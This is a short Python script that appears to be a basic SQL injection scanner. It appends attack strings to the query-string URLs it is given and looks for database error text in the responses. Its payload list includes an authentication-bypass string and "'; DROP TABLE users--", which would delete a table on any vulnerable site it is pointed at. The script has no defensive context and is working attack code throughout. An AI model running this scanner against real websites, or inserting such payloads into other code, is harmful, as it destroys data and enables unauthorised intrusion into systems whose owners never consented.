import requests

payloads = ["'", "' OR 1=1--", "'; DROP TABLE users--"]

def scan(base_url, urls):
    vulnerable = []

    for url in urls:
        if '?' not in url:
            continue
        for payload in payloads:
            test_url = url + payload
            try:
                res = requests.get(test_url, timeout=5)
                if "sql" in res.text.lower() or "syntax" in res.text.lower():
                    vulnerable.append(url)
                    break
            except:
                continue
    return vulnerable
